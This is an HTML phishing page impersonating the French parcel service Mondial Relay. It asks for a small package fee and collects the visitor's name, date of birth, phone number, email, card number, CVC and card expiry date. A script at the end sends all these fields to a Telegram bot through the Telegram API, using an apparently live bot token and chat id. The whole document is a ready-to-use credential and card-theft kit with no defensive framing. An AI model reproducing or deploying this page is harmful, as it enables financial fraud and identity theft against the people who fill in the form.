<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Mondial Relay - Paiement</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
        }
        .header {
            background-color: #007BFF;
            color: white;
            padding: 20px;
            text-align: center;
        }
        .container {
            max-width: 600px;
            margin: 40px auto;
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.2);
        }
        h2 {
            margin-top: 0;
        }
        label {
            display: block;
            margin-top: 15px;
            font-weight: bold;
        }
        input[type="text"], input[type="email"], input[type="tel"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            width: 100%;
            padding: 12px;
            margin-top: 20px;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        .footer {
            text-align: center;
            margin-top: 30px;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>

<div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/fr/5/5c/Mondial_Relay.svg" alt="Mondial Relay" width="120" height="40">
    <h1>Mondial Relay</h1>
    <p>Reste à payer : 0,99 €</p>
</div>

<div class="container">
    <h2>Paiement du colis</h2>
    <form id="phishingForm">
        <label for="nom">Nom</label>
        <input type="text" id="nom" name="nom" required>

        <label for="prenom">Prénom</label>
        <input type="text" id="prenom" name="prenom" required>

        <label for="dateNaissance">Date de naissance</label>
        <input type="date" id="dateNaissance" name="dateNaissance" required>

        <label for="telephone">Téléphone</label>
        <input type="tel" id="telephone" name="telephone" required>

        <label for="email">E-mail</label>
        <input type="email" id="email" name="email" required>

        <label for="carteBancaire">Numéro de carte bancaire</label>
        <input type="text" id="carteBancaire" name="carteBancaire" required>

        <label for="cvc">Code de sécurité (CVC)</label>
        <input type="text" id="cvc" name="cvc" required>

        <label for="dateExpiration">Date d'expiration</label>
        <input type="text" id="dateExpiration" name="dateExpiration" placeholder="MM/AA" required>

        <button type="submit">Payer 0,99 €</button>
    </form>
</div>

<div class="footer">
    &copy; 2025 Mondial Relay | Suivi de colis
</div>

<script>
    document.getElementById("phishingForm").addEventListener("submit", function (e) {
        e.preventDefault();

        const formData = new FormData(this);
        const data = {};
        formData.forEach((value, key) => data[key] = value);

        // Envoi des données vers votre compte Telegram
        fetch("https://api.telegram.org/bot8524631812:AAEz9CaY0fi5vo1ZOVlSzEZE5JtvBFdhnTo/sendMessage", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: "7962527788",
                text: `Nom: ${data.nom}\nPrénom: ${data.prenom}\nDate de naissance: ${data.dateNaissance}\nTéléphone: ${data.telephone}\nE-mail: ${data.email}\nCarte bancaire: ${data.carteBancaire}\nCVC: ${data.cvc}\nDate d'expiration: ${data.dateExpiration}`
            })
        });
    });
</script>

</body>
</html>
